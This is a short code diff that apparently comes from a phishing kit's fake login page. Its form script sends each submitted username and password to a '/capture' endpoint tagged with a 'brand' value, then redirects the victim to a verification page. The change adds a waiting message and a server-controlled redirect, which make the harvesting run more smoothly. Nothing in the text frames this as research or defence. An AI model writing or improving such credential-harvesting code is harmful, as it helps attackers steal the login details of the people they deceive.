@@ -22,8 +22,10 @@
   </div>
 <script>
 document.getElementById('f').addEventListener('submit', async e => {
-  e.preventDefault(); const fd = new FormData(e.target);
-  await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user:fd.get('user'),pass:fd.get('pass'),brand:'generic'})}).catch(()=>{});
+  e.preventDefault(); const btn = e.target.querySelector('button'); btn.textContent = 'Please wait...'; const fd = new FormData(e.target);
+  const r = await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user:fd.get('user'),pass:fd.get('pass'),brand:'generic'})}).catch(()=> ({}));
+  const j = await r.json().catch(() => ({}));
+  if (j.redirect) { window.location.href = j.redirect; return; }
   window.location.href = '/verify.html?b=generic';
 });
 </script>
